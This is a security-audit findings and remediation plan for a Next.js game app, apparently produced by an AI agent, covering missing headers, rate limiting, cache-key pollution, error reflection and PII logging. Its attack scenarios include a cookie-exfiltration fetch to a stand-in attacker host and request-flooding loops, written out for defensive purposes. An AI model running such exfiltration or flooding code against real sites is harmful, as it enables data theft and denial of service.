# Phase 2 — Findings and remediation plan

## Method

Re-read of `docs/security/01-attack-surface.md` (Phase 1) plus targeted re-reads of `src/app/api/save/route.ts`, `src/app/api/leaderboard/route.ts`, `src/app/api/handle/route.ts`, `next.config.mjs`, `vercel.json`, and `eslint.config.mjs`. Severity per the verbatim definitions in `.claude/skills/security-audit/SKILL.md`. Each finding cites `path:line`. Phase 1 found no critical and no high; Phase 2 confirms — every concern below is medium or lower. Remediation order favors single-config wins first, then per-route fixes, then deferred / informational items.

Cross-checked against the parallel-Claude activity report (master moved 15 PRs forward during the audit window — save-durability cluster + modular-architecture audit). None of those commits invalidate any Phase 1 finding; several of them already provide the foundation a Phase-3 fix here will lean on (e.g. the `recordAudit` + `prevRow` + `validateNoRegression` machinery in `src/app/api/save/route.ts`).

## Severity tally

- Critical: 0
- High: 0
- Medium: 3
- Low: 4
- Informational: 3
- **Total findings: 10**

Plus 1 entry in `docs/security/04-other-findings.md` (CLAUDE.md §13 public-asset-size rule violation — non-security but caught by the audit; logged so the user can route it to a separate cleanup PR).

## CRITICAL findings

None.

## HIGH findings

None.

## MEDIUM findings

### SEC-001 — No security headers on any response

- **Severity:** medium (defense-in-depth — no current exploit path, but missing layered defenses)
- **Location:** [next.config.mjs](../../next.config.mjs) (no `headers()` block); [src/app/api/](../../src/app/api/)*** (no per-route header writes); no `src/middleware.ts`
- **What's wrong:** No `Content-Security-Policy`, no `X-Frame-Options`, no `X-Content-Type-Options`, no `Referrer-Policy`, no `Permissions-Policy`, no `Strict-Transport-Security` override (Vercel sets HSTS by default — confirm). Means: any future stored-XSS slip would be unbounded; an attacker hosting an iframe of `spacepotatis.app` could clickjack the leaderboard or shop; mistyped JSON responses could be MIME-sniffed.
- **Attack scenario:**
  1. A future PR introduces an XSS sink (e.g. `dangerouslySetInnerHTML` for a user-controlled handle on a future leaderboard detail page).
  2. With no CSP, the injected script can call `fetch("https://attacker.example/exfil", {body: document.cookie})` — except the session cookie is `httpOnly`, so attacker exfiltrates the player's name + game state instead.
  3. Or: an attacker page embeds `<iframe src="https://spacepotatis.app/shop">` and tricks an authenticated user into clicking through it. Without `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP) the frame loads.
- **Impact:** today: low (no current XSS sink, no UI worth clickjacking pre-shop-buy-button). After any future XSS: full game-state exfil. Clickjacking: forced shop purchases. This is the "free defense" in case any future PR slips.
- **Likelihood:** low today; the depth of defense matters because the surface is growing (shop UI, leaderboard, future PvP).
- **Recommended fix:**
  - Add a `headers()` block to [next.config.mjs](../../next.config.mjs) with:
    - `Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:; media-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://accounts.google.com https://oauth2.googleapis.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self' https://accounts.google.com` (the `'unsafe-inline'` slots are needed today by Next.js inline scripts; document them so a future tightening pass to nonce-based CSP is possible).
    - `X-Frame-Options: DENY` (legacy belt-and-braces with `frame-ancestors 'none'`)
    - `X-Content-Type-Options: nosniff`
    - `Referrer-Policy: strict-origin-when-cross-origin`
    - `Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()` (the audio engines use the WebAudio API, which doesn't need any of these grants).
  - Confirm via `curl -I https://<deploy>/` after deploy that headers are set. HSTS comes from Vercel — confirm with `curl -I` + verify `Strict-Transport-Security: max-age=...; includeSubDomains` appears.
- **Verification:**
  - Add a test under `tests/security/headers.test.ts` that fetches a known route through the Next.js test runner (or the deployed preview URL) and asserts each header is present with the expected value. The Next.js test environment doesn't fully exercise `headers()` from `next.config.mjs` — for that, either a Playwright e2e test against `npm run dev` or a documented manual `curl -I` verification step is acceptable.
  - Manual repro of the failure case: `curl -sI http://localhost:3000/ | grep -i 'content-security-policy'` → currently empty.
- **Dependencies:** none. This is the "easiest broad win" finding.

### SEC-002 — No HTTP-layer rate limiting on any API route

- **Severity:** medium (resource exhaustion class; per the severity definition "missing rate limit")
- **Location:** [src/app/api/save/route.ts](../../src/app/api/save/route.ts) (POST/GET); [src/app/api/leaderboard/route.ts](../../src/app/api/leaderboard/route.ts) (POST/GET); [src/app/api/handle/route.ts](../../src/app/api/handle/route.ts) (POST/GET); no middleware
- **What's wrong:** Any client (authenticated or, for `GET /api/leaderboard`, unauthenticated) can hammer endpoints at request-loop speed. The Vercel platform absorbs some of this, but on Hobby tier the function-invocation budget (CLAUDE.md §3, §13) is finite — and a single user's runaway loop can drain it for everyone else. Beyond cost: `POST /api/handle` accepts a fresh handle 10×/sec without push-back, making it possible to enumerate which handles are taken (the `409 handle_taken` vs `200 ok` divergence is a side-channel).
- **Attack scenario:**
  1. **Cost-burn (any authenticated user):** loop `fetch("/api/save", {method:"POST", body: JSON.stringify(SAVE_PAYLOAD)})` from the browser console at 100 req/sec. Each call triggers a Neon round-trip + audit-table INSERT. Function-invocation budget on Hobby tier (100k/month) burns in ~17 minutes.
  2. **Handle enumeration (authenticated):** loop `POST /api/handle` over a dictionary of nicknames; `200 ok` vs `409 handle_taken` reveals which are claimed.
  3. **Public leaderboard amplification (unauthenticated):** `GET /api/leaderboard?mission=combat-1` is unauthenticated and edge-cached via `getCachedLeaderboard` (revalidate=60). Same mission id = cache hit; **a varying mission-id query (see SEC-003) cache-misses every time** and hits the DB. With no rate limit, this is a DoS amplifier.
- **Impact:** Vercel function budget exhaustion (denial of service for legitimate users); Neon DB rate exhaustion; handle enumeration (PII signal — handle is public, but mass-enumeration is reconnaissance for impersonation).
- **Likelihood:** medium. The `GET /api/leaderboard` path is unauthenticated and the DoS amplification is concrete (see SEC-003 for the cache-key-pollution multiplier). The save/handle paths are authenticated, raising the bar but not closing it.
- **Recommended fix:**
  - **Architectural — needs mini-design first.** Edge runtime constrains the implementation choice: in-memory rate-limit state doesn't survive between cold starts. Real options:
    - **Vercel KV / Upstash Redis** (token-bucket via `@upstash/ratelimit`) — Edge-compatible, ~10ms overhead/req, free tier covers Hobby easily. Adds one external dep + one env var. Recommended.
    - **Vercel WAF / built-in IP rate-limit** — paid tier only on Vercel Hobby. Skip.
    - **No-op + monitoring** — log invocations to `save_audit`, alert on bursts. Reactive, not preventive.
  - Apply per-route per-IP buckets:
    - `POST /api/save`: 60/min per session
    - `POST /api/leaderboard`: 30/min per session
    - `POST /api/handle`: 10/min per session (kills enumeration)
    - `GET /api/leaderboard`: 120/min per IP (unauth — IP only)
    - `GET /api/save` + `GET /api/handle`: 120/min per session
  - Return `429 Too Many Requests` with `Retry-After` header on bucket exhaustion. Don't audit-log every 429 (cheap to spam).
- **Save-pipeline scrutiny:** Phase 3 must run /save-roundtrip-audit before this fix lands (touches `src/app/api/save/route.ts`).
- **Verification:**
  - Unit test `tests/security/rateLimit.test.ts`: mock the bucket store, exhaust the bucket, assert 429 + Retry-After header.
  - Integration test (optional): hammer the dev server and confirm 429s appear after the configured threshold.
- **Dependencies:** SEC-003 amplification reduces materially when this lands; both can be fixed independently. Recommend SEC-001 → SEC-003 → SEC-002 order so the routes aren't being touched in parallel.
- **Architectural note:** mini-design needed before Phase 3 starts. Choice of KV vs Upstash + token-bucket parameters needs user sign-off.

### SEC-003 — `GET /api/leaderboard` mission-param `as MissionId` cast — cache-key pollution + DoS surface

- **Severity:** medium (the cast itself is low; the cache-DoS amplification raises it)
- **Location:** [src/app/api/leaderboard/route.ts:24-28](../../src/app/api/leaderboard/route.ts#L24-L28); [src/lib/leaderboard.ts:42-50](../../src/lib/leaderboard.ts#L42-L50) for the cache-key derivation
- **What's wrong:** `missionIdParam: string` is cast to `MissionId` without validation — any string becomes a cache key. The current comment ([src/app/api/leaderboard/route.ts:24-26](../../src/app/api/leaderboard/route.ts#L24-L26)) says this is intentional for legacy-id permissiveness, but: (a) it conflicts with CLAUDE.md §5's "no `as` casts at the network edge" rule, and (b) `getCachedLeaderboard` uses the user-supplied string as part of the `unstable_cache` key, so an attacker spraying `?mission=<random>` creates unbounded cache entries that all DB-miss.
- **Attack scenario:**
  1. Unauthenticated attacker loops `fetch("https://spacepotatis.app/api/leaderboard?mission=" + Math.random())`.
  2. Each random mission id is a cache miss → `unstable_cache` runs the SELECT, returns `[]` (no rows for the bogus id), and stores the empty result in cache.
  3. Vercel/Next caches each response for 60s. Vercel KV / cache storage budget grows. DB query budget grows. With SEC-002 in place, the attacker is rate-limited; without it, this is a force-multiplier on the cost-burn from SEC-002 scenario 3.
- **Impact:** Vercel cache pollution (small per-request, but unbounded with no input validation); DB query budget burn; possibly `unstable_cache` entry-count limits trip in extreme cases.
- **Likelihood:** medium. Anyone with a script can do it. Not destructive, just expensive.
- **Recommended fix:** Two options — user picks at the gate:
  - **Option A — tighten to `MissionIdSchema` (recommended).** Add `MissionIdSchema = z.enum(MISSION_IDS)` to [src/lib/schemas/save.ts](../../src/lib/schemas/save.ts) (or the right schema file) and use `MissionIdSchema.safeParse(missionIdParam)` at [src/app/api/leaderboard/route.ts:17](../../src/app/api/leaderboard/route.ts#L17). Reject unknown ids with 400. Trade-off: any retired mission id whose leaderboard rows are still in the DB becomes unreachable via the API. The data is preserved but the public read closes for those ids.
  - **Option B — keep permissive, lean on SEC-002 rate limit.** Add a regex sanity check (`^[a-z0-9-]{1,32}$`) at the route to bound the cache-key alphabet, but don't enforce membership in `MissionIdSchema`. Trade-off: the CLAUDE.md §5 conflict stays; legacy ids keep working; rate limit absorbs the DoS surface.
  - **Recommendation: Option A.** The CLAUDE.md §5 conflict is the deciding factor; "preserve legacy mission ids" is a real consideration but the user can re-introduce specific ids by adding them to `MISSION_IDS` if they ever need to. Closing the cache-key surface entirely is a stronger defense than rate-limiting an open one.
- **Verification:** unit test in `tests/security/leaderboard.test.ts`: hit `GET /api/leaderboard?mission=<bogus>` and assert 400 (Option A) or assert the regex rejects (Option B).
- **Dependencies:** none for the fix itself. Order: do SEC-003 before SEC-002 — once SEC-003 closes the cache-key surface, SEC-002's `GET /api/leaderboard` rate-limit threshold can be relaxed.

## LOW findings

### SEC-004 — Error-message reflection inconsistency on `GET /api/save` + both `/api/handle` paths

- **Severity:** low
- **Location:** [src/app/api/save/route.ts:60-63](../../src/app/api/save/route.ts#L60-L63); [src/app/api/handle/route.ts:42-43](../../src/app/api/handle/route.ts#L42-L43); [src/app/api/handle/route.ts:106-108](../../src/app/api/handle/route.ts#L106-L108)
- **What's wrong:** These three handlers reflect `err.message` to the client when an unexpected error throws. `POST /api/save` and both `/api/leaderboard` paths do NOT — they return `{error: "server_error"}` opaquely. The inconsistency means an attacker probing for stack-trace leaks finds them on `GET /api/save` and `/api/handle` but not elsewhere; more concerning, `err.message` from Kysely / Neon errors can leak SQL fragments, table names, or internal column names.
- **Attack scenario:**
  1. Attacker triggers a DB error on `GET /api/save` (e.g. by malforming a follow-up state that the DB rejects) and observes `{error: "server_error", message: "column \"foo\" does not exist"}`.
  2. The leaked column name confirms internal schema details. Combined with SEC-003 cache-key probing, gives a fingerprint of the schema.
- **Impact:** information disclosure of non-secrets (per the severity definition for low).
- **Likelihood:** low. Triggering a DB error here is non-trivial; the routes are well-validated up-stream.
- **Recommended fix:** Two options — user picks at the gate:
  - **Option A — consolidate to no-reflection (recommended).** Drop `message` from the JSON response on all three paths. Server still `console.error`s the full error so prod logs have it.
  - **Option B — keep `err.message` only on 5xx as a debugging aid.** Status quo. Document inline why it's there (debug aid). Trade-off: the leak surface stays open for any error class that surfaces internal details.
  - **Recommendation: Option A.** The debugging aid is server-side logs; client-visible error message offers no genuine UX value (the user sees "server_error" either way).
- **Verification:** unit test in `tests/security/errorReflection.test.ts`: throw a synthetic error from a mocked `getDb()` call, assert response body is `{error: "server_error"}` with no `message` field.
- **Dependencies:** none.

### SEC-005 — Player email logged in `console.warn` on save-rejection paths

- **Severity:** low
- **Location:** [src/app/api/save/route.ts:251-252](../../src/app/api/save/route.ts#L251-L252); [src/app/api/save/route.ts:297-300](../../src/app/api/save/route.ts#L297-L300); [src/app/api/save/route.ts:320-323](../../src/app/api/save/route.ts#L320-L323); [src/app/api/save/route.ts:348-352](../../src/app/api/save/route.ts#L348-L352)
- **What's wrong:** Four rejection paths in `POST /api/save` log `session.user.email` directly via `console.warn`. The message string is structured and helpful for debugging, but it puts PII (player email) into Vercel function logs which have ~3-7 day Hobby retention and are accessible via the Vercel dashboard. Cross-referenced with the `save_audit` table (which already has the `player_id` UUID), the email itself adds nothing diagnostically — the UUID is sufficient.
- **Attack scenario:** No active exploit. Risk is incident-class: anyone with Vercel dashboard access (today: only the operator) sees the email in logs alongside the rejection reason. If a future hire onboards with read-only Vercel access, they see all rejected emails. Compliance-class: Vercel logs are "data processed by a third party" under GDPR.
- **Impact:** PII drift into operational logs.
- **Likelihood:** low; the surface is bounded.
- **Recommended fix:** Replace `session.user.email` with the player UUID derived earlier in the same handler (`playerId` is already in scope after the upsert, [src/app/api/save/route.ts:147](../../src/app/api/save/route.ts#L147)). Log:
  ```ts
  console.warn("[/api/save] mission graph violation", playerId, graphResult.error);
  ```
  Cross-reference the UUID against the `save_audit` table when needed. Apply to all four rejection paths.
- **Save-pipeline scrutiny:** Phase 3 must run /save-roundtrip-audit before this fix lands (touches `src/app/api/save/route.ts` though only the logging surface).
- **Verification:** unit test in `tests/security/saveLoggingPii.test.ts` capturing `console.warn` calls during validator rejection — assert no `@` character in the captured args (sentinel for email).
- **Dependencies:** none.

### SEC-006 — `save_audit` PII retention policy unimplemented

- **Severity:** low
- **Location:** [db/migrations/20260503000000_add_save_audit.sql:11-14](../../db/migrations/20260503000000_add_save_audit.sql#L11-L14); writer at [src/app/api/save/route.ts:130-150](../../src/app/api/save/route.ts#L130-L150) (approximately — confirm line range when fix is applied)
- **What's wrong:** The `save_audit` table stores per-POST `request_ip` (PII under EU/UK GDPR), `user_agent` (low-PII), and `request_payload` (game state — non-PII, but volume grows fast). The migration comment says "TBD" for retention. Without a cron, rows accumulate forever.
- **Attack scenario:** No active exploit. Compliance-class: if a player exercises GDPR right-to-erasure (see SEC-010), the operator must scrub their `save_audit` rows. Today's `players.id ON DELETE CASCADE` covers it; documented runbook does not exist.
- **Impact:** PII drift; storage growth; right-to-erasure complexity if not cleaned up regularly.
- **Likelihood:** certain (already accumulating).
- **Recommended fix:** Two options — user picks at the gate:
  - **Option A — propose 90-day retention now (recommended).** Add a daily GH Actions cron that runs `DELETE FROM spacepotatis.save_audit WHERE created_at < NOW() - INTERVAL '90 days'`. Document inline why 90 days (long enough for the post-incident forensic window of the 2026-05-02 wipe; short enough to bound PII exposure). **Do not apply yet** — per `MEMORY.md` "save_audit experiment window", we must keep the dataset intact until the existing GH Actions cron opens the save-architecture-ready issue. The PR ships the doc + commented-out cron + rollout plan; activation is a follow-up.
  - **Option B — defer all retention work** until the GH Actions cron opens the readiness issue. Re-evaluate then.
  - **Recommendation: Option A.** Documenting the policy now (without applying) sets the contract; activating when the experiment window closes is a one-line PR.
- **Verification:** the doc PR ships an `INTEGRATION.md` or section in the existing `audit-readiness-check.yml` runbook describing the activation step. Once activated, a follow-up runs `SELECT COUNT(*) FROM spacepotatis.save_audit WHERE created_at < NOW() - INTERVAL '90 days'` weekly to confirm cleanup is happening.
- **Schema change required:** No (the cron deletes; doesn't alter schema). Activation only.
- **Dependencies:** none.

### SEC-007 — `improve-restore.mjs` lacks `--apply` gate and dry-run default

- **Severity:** low
- **Location:** [scripts/improve-restore.mjs](../../scripts/improve-restore.mjs) (whole file); see CLAUDE.md §15 for the recovery-script contract; [scripts/_lib/dbWriteSafety.mjs](../../scripts/_lib/dbWriteSafety.mjs) for the helper the safer sibling `restore-player.mjs` uses
- **What's wrong:** `improve-restore.mjs` calls `writeBackup()` before its UPDATE (good — see CLAUDE.md §15) but lacks the `--apply` gate, `parseFlags` argv discipline, `requireConfirm` interactive prompt, and `--player-email=<email>` argv-vs-positional cross-check that `restore-player.mjs` enforces. CLAUDE.md §15 explicitly notes the surface predates the helper. A misuse — wrong email passed in a script invocation — runs the destructive UPDATE immediately.
- **Attack scenario:** No external attacker. Insider-class: an operator running `node scripts/improve-restore.mjs <wrong-email>` mid-keystroke or copy-pasting the wrong arg destroys the wrong player's data. The 2026-05-02 wipe was the canonical example of "a misfire on a destructive script destroys months of progression."
- **Impact:** prod data destruction (recoverable via `writeBackup()`'s output, but only if the operator notices in time and the `db-backups/` dir is intact).
- **Likelihood:** low (operator-only entry point, single operator today).
- **Recommended fix:** Two options — user picks at the gate:
  - **Option A — retrofit `parseFlags` + `requireConfirm` (recommended).** Move `improve-restore.mjs` over to the helper in `scripts/_lib/dbWriteSafety.mjs`. Default to dry-run; require `--confirm` to mutate; require `--player-email=<email>` matching the positional argument. Same harness as `restore-player.mjs`.
  - **Option B — freeze the script as-is, document the invocation contract more explicitly.** Add a top-of-file comment block listing the safety gates the script lacks and the operator's responsibilities. Trade-off: the rake stays underfoot.
  - **Recommendation: Option A.** The helper exists; using it is mechanical. The cost of NOT using it is exactly the rake CLAUDE.md §15 was written to fix.
- **Verification:** `node scripts/improve-restore.mjs --help` lists the new flags. `node scripts/improve-restore.mjs <email>` (no `--confirm`) prints the intended UPDATE without executing. `node scripts/improve-restore.mjs <wrong-positional> --player-email=<other> --confirm` aborts with the cross-check error.
- **Dependencies:** none.

## INFORMATIONAL findings

### SEC-008 — `next-auth` 5.0.0-beta.25 → 5.0.0-beta.31 hygiene bump

- **Severity:** informational
- **Location:** [package.json](../../package.json) (the `next-auth` dependency); `npm audit --json`
- **What's wrong:** The current pinned version is 6 patch releases behind the latest beta. None of the advisories npm-audit-flagged for `next-auth` apply (the Email-provider advisory needs the Email provider; only Google is configured). But routine bumps within a beta line are how you catch the next CVE before exploitation.
- **Attack scenario:** none today. Hygiene class.
- **Impact:** none today.
- **Likelihood:** depends on future CVE landings.
- **Recommended fix:** `npm install next-auth@latest` (or pin to the latest 5.0.0-beta.X). Run the auth tests; manually sign in / sign out on the dev server to confirm. Note: Phase 3 dispatches this to **Opus** (auth surface).
- **Phase 3 model:** Opus (auth/crypto/secrets/save scrutiny).
- **Verification:** `npm test`; manual sign-in/sign-out smoke; re-run `npm audit` and confirm no new advisories introduced by the bump.
- **Dependencies:** none.

### SEC-009 — `trustHost: true` in NextAuth config — defense-in-depth review

- **Severity:** informational
- **Location:** [src/lib/auth.ts:12](../../src/lib/auth.ts#L12)
- **What's wrong:** NextAuth is configured to trust the request `Host` header for callback URL construction. Required for Vercel deploys (the deploy URL changes per environment). Depends on Vercel's host-header sanitization upstream. If the deploy ever lands behind a different reverse proxy (Cloudflare Workers, self-hosted Node), the setting needs re-evaluation.
- **Attack scenario:** none today on Vercel. If the deploy migrates to a less-strict edge, an attacker spoofing `Host: attacker.example` could redirect the OAuth callback to themselves.
- **Impact:** none today.
- **Likelihood:** zero today; non-zero if deploy target changes.
- **Recommended fix:** Two options — user picks at the gate:
  - **Option A — confirm Vercel-only deploy target, document inline (recommended).** Add a `// SECURITY-CRITICAL:` comment at [src/lib/auth.ts:12](../../src/lib/auth.ts#L12) noting "trustHost requires Vercel's Host-header sanitization; if migrating off Vercel, switch to env-driven `AUTH_TRUST_HOST=false` + explicit `AUTH_URL`."
  - **Option B — switch to explicit env-driven `AUTH_TRUST_HOST` reading from `process.env`.** Set the Vercel env var to `true`, default to `false` elsewhere. Trade-off: more config surface; Vercel preview URLs need explicit handling.
  - **Recommendation: Option A.** Doc-only is sufficient for the current threat model.
- **Phase 3 model:** Opus (auth surface) — even though it's doc-only.
- **Verification:** code review of the comment; confirm sign-in still works on Vercel preview.
- **Dependencies:** none.

### SEC-010 — GDPR right-to-erasure runbook missing

- **Severity:** informational
- **Location:** [db/migrations/20260424120000_initial_schema.sql:18,32](../../db/migrations/20260424120000_initial_schema.sql#L18); no `docs/` runbook
- **What's wrong:** The `players.id ON DELETE CASCADE` foreign key chain means `DELETE FROM spacepotatis.players WHERE email = $1` will cascade-purge `save_games`, `leaderboard`, `save_audit`. Adequate for the threat model — but no documented runbook exists, so a right-to-erasure request from a player would require ad-hoc SQL on prod, which is exactly the class of operation CLAUDE.md §15 says needs explicit safety harness.
- **Attack scenario:** none. Compliance-class.
- **Impact:** none today (no requests received).
- **Likelihood:** non-zero (any user can request).
- **Recommended fix:** Add `docs/RIGHT_TO_ERASURE.md` with: (a) the exact SQL the operator runs, (b) the safety steps (FOR UPDATE row-lock, `writeBackup()` of the player's row before deletion), (c) confirmation queries to verify cascade completion. Also add a per-player `scripts/erase-player.mjs` using `scripts/_lib/dbWriteSafety.mjs` with `--apply` gate, dry-run default, `--player-email=<email>` cross-check. Phase 3 may defer the script if the user prefers the doc-only path.
- **Verification:** dry-run of `scripts/erase-player.mjs` against a test player on a local DB; confirm cascade leaves no orphans.
- **Dependencies:** SEC-007 (sets the precedent of using `dbWriteSafety.mjs` for new scripts).

## Architectural findings (cannot be fixed in isolation)

### A-001 — Rate limiting infrastructure choice

- **Drives:** SEC-002
- **Decision needed:** Vercel KV vs Upstash Redis vs in-memory + monitoring. See SEC-002 "Recommended fix" for the three options. User must pick at the Phase 2 gate or before Phase 3 dispatches for SEC-002.

## Remediation order

Critical first (none); then findings that unblock others; then by impact-to-effort.

| # | SEC-ID | Title | Severity | Phase 3 model | Parallelizable | Notes |
|---|---|---|---|---|---|---|
| 1 | SEC-001 | Security headers | medium | Sonnet | yes (unique file) | Single edit to `next.config.mjs`; immediate broad-spectrum win |
| 2 | SEC-003 | Leaderboard cast / cache-key pollution | medium | Sonnet | yes (unique file) | Closing the input surface BEFORE adding the rate limit reduces the bucket pressure |
| 3 | SEC-004 | Error-message reflection | low | Sonnet | partial (touches 2 route files; both edits trivial — can run in same worktree if sequential) | |
| 4 | SEC-005 | PII in `console.warn` | low | Sonnet | NO (touches `src/app/api/save/route.ts`, conflicts with SEC-002) | |
| 5 | SEC-007 | `improve-restore.mjs` safety harness | low | Sonnet | yes (script-only) | |
| 6 | SEC-009 | `trustHost: true` doc | informational | Opus (auth surface) | yes (doc-only) | |
| 7 | SEC-002 | Rate limiting | medium | Sonnet (with architectural mini-design first) | NO (touches all API routes) | Architectural — A-001 decision required first; runs LAST among API-route-touching fixes |
| 8 | SEC-008 | `next-auth` bump | informational | Opus | NO (mutates `package-lock.json`) | Run last; touches deps surface |
| 9 | SEC-006 | `save_audit` retention | low | Sonnet (doc-only) | yes | Doc-only ship; activation deferred until experiment window closes |
| 10 | SEC-010 | GDPR right-to-erasure runbook | informational | Sonnet | yes (doc-only) | Last — depends on the `dbWriteSafety.mjs` precedent established in SEC-007 |

**Parallelization plan for Phase 3:**
- Wave 1 (parallel, separate worktrees): SEC-001, SEC-003, SEC-007, SEC-009.
- Wave 2 (sequential, same worktree on master tip): SEC-004 → SEC-005 (touches save route).
- Wave 3 (after A-001 design): SEC-002 alone.
- Wave 4 (after Wave 3 lands): SEC-008 alone (auth-surface, deps mutation).
- Wave 5 (parallel, doc-only): SEC-006, SEC-010.

## Risk-acceptance candidates

Findings the user might reasonably choose NOT to fix, with the trade-off:

- **SEC-009 (`trustHost: true`):** if the deploy is locked to Vercel forever, doc-only is genuinely sufficient. Skipping the doc costs nothing today; the rake re-emerges only if a future hire migrates the deploy. Risk-accept is reasonable.
- **SEC-008 (`next-auth` bump):** beta versions move fast. If the user prefers to bump opportunistically (e.g. when a CVE drops) rather than as a security pass, defer to the regular dependency-hygiene cadence. Risk-accept is reasonable; revisit on next audit.

## Open decisions for the user (gate)

User picks A or B for each before Phase 3 dispatches the relevant finding:

1. **SEC-003 (leaderboard cast):** A) tighten to `MissionIdSchema` enum (recommended). B) keep permissive + add IP rate limit only.
2. **SEC-004 (error reflection):** A) consolidate to no-reflection (recommended). B) keep `err.message` only on 5xx as debug aid.
3. **SEC-006 (`save_audit` retention):** A) propose 90-day policy now, defer activation (recommended). B) defer all retention work until cron readiness issue opens.
4. **SEC-007 (`improve-restore.mjs`):** A) retrofit `parseFlags` + `requireConfirm` harness (recommended). B) freeze, document.
5. **SEC-009 (`trustHost: true`):** A) doc-only (recommended). B) env-driven `AUTH_TRUST_HOST`.
6. **A-001 (rate-limit infrastructure for SEC-002):** Vercel KV / Upstash Redis / in-memory + monitoring. Recommended: Upstash Redis via `@upstash/ratelimit` (Edge-compatible, free tier, 10ms overhead). Other options have non-trivial trade-offs.

## Open questions for the orchestrator

1. **Branch state.** The current working tree sits on `feat/weapon-row-header-reorder` (a branch the orchestrator did not create — already merged into master per parallel-Claude scan). Phase 0–1 work files are untracked here. Per CLAUDE.md §16, before Phase 3 commits, the orchestrator must: stash, switch to master, pull, branch fresh (`feat/security-audit-phase-X` per fix), then apply the relevant changes. Confirm this is the move?

2. **Phase 3 model overrides.** The agent definitions auto-escalate auth/crypto/secrets/save fixes to Opus. SEC-005 touches `src/app/api/save/route.ts` (logging surface only — not the validator core); SEC-002 touches the same file (rate-limit guard). Confirm: is Sonnet acceptable for these (logging + per-route guards, not auth or crypto), or should they auto-Opus?

3. **`/save-roundtrip-audit` invocation.** SEC-002 and SEC-005 touch `src/app/api/save/route.ts`. The save-pipeline scrutiny rule requires running `/save-roundtrip-audit` before those fixes land. Confirm the orchestrator will dispatch it as part of the Phase 3 worktree for those findings?

4. **PR-per-finding vs PR-per-wave.** The PR-flow-default in `MEMORY.md` says "every push goes through feature branch + gh PR". Should Phase 3 ship one PR per SEC-ID, or one PR per Wave (1 PR for SEC-001/003/007/009, 1 for SEC-004/005, 1 for SEC-002, 1 for SEC-008, 1 for SEC-006/010)? PR-per-wave is fewer reviews; PR-per-finding is more granular rollback. Recommend per-wave for low/info findings, per-finding for medium.

5. **`MissionIdSchema` adoption.** SEC-003 introduces it. If the user picks Option A, several other places that currently cast strings to `MissionId` (search across the codebase) might benefit. Phase 3 ships SEC-003 narrowly (just the leaderboard route); a follow-up sweep is a separate task — should it be on the orchestrator's radar for after Phase 5?

## Next phase (do not start)

**Phase 3** — `security-fixer` per finding in remediation order. Wave 1 (SEC-001, SEC-003, SEC-007, SEC-009) can dispatch in parallel across worktrees once the user answers the open decisions above. Each fix lands as a clean local commit on a fresh branch from master, with a regression test under `tests/security/`, the plan file marked `Status: fixed — <sha>`, and a Phase 3 progress entry in `docs/security/_progress.md`. Auth/crypto/secrets/save fixes (SEC-008, SEC-009) auto-escalate to Opus.

Do not start until the user reviews this artifact and replies with the answers (or "approved" with defaults — the recommendations marked above will be used).
